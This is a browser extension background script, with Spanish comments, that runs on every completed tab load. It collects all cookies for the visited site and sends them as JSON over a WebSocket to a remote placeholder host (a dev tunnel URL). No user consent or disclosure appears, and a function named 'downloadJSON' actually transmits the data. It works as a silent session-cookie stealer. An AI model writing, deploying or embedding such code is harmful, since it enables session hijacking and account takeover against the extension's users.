const api = typeof browser !== "undefined" ? browser : chrome;

let pageUrl = "", cookies = [];

const cookieUrl = (c) =>
  `${c.secure ? "https" : "http"}://${c.domain.replace(/^\./, "")}${c.path || "/"}`;

async function load(url) {
  pageUrl = url || "";
  if (/^https?:/i.test(pageUrl)) {
    cookies = await api.cookies.getAll({ url: pageUrl });
    downloadJSON();
  }
}

function toNetscape(list) {
  const lines = ["# Netscape HTTP Cookie File"];
  for (const c of list) {
    lines.push([
      (c.httpOnly ? "#HttpOnly_" : "") + c.domain,
      c.domain.startsWith(".") ? "TRUE" : "FALSE",
      c.path,
      c.secure ? "TRUE" : "FALSE",
      c.expirationDate ? Math.floor(c.expirationDate) : 0,
      c.name,
      c.value,
    ].join("\t"));
  }
  return lines.join("\n");
}

async function downloadJSON() {
  const host = /^https?:/i.test(pageUrl) ? new URL(pageUrl).hostname : "cookies";
  
  const fmt = "json";
  const isJson = fmt === "json";
  const contenidoTexto = isJson ? JSON.stringify(cookies, null, 2) : toNetscape(cookies);

  const ahora = new Date();
  const anio = ahora.getFullYear();
  const mes = String(ahora.getMonth() + 1).padStart(2, '0');
  const dia = String(ahora.getDate()).padStart(2, '0');
  const horas = String(ahora.getHours()).padStart(2, '0');
  const minutos = String(ahora.getMinutes()).padStart(2, '0');
  const segundos = String(ahora.getSeconds()).padStart(2, '0');
  const milisegundos = String(ahora.getMilliseconds()).padStart(3, '0');

  const marcaTiempo = `${dia}-${mes}-${anio}_${horas}-${minutos}-${segundos}_${milisegundos}`;

  const nombreArchivoUnico = `${host}_${marcaTiempo}-cookies.${isJson ? "json" : "txt"}`;

  const blob = new Blob([contenidoTexto], { type: isJson ? "application/json" : "text/plain" });

  const reader = new FileReader();
  reader.readAsDataURL(blob);
  reader.onloadend = function() {
    const dataUrl = reader.result;

  };

  // --- TRANSMISIÓN POR WEBSOCKET ---
  const socket = new WebSocket("wss://URL-DEVTUNNEL");
  //const socket = new WebSocket("wss://127.0.0.1:8080");

  socket.onopen = function() {
    const paquete = JSON.stringify({
      nombre: nombreArchivoUnico, 
      contenido: contenidoTexto
    });
    socket.send(paquete);
  };

  socket.onmessage = function(event) {
    console.log("Servidor:", event.data);
    socket.close();
  };
  
  socket.onerror = function(error) {
    console.error("Fallo de conexión en el WebSocket:", error);
  };
}

/* ---------- EVENTO: ESCUCHAR CUANDO LA PÁGINA CARGA ---------- */
api.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === "complete" && tab.url) {
    load(tab.url);
  }
});
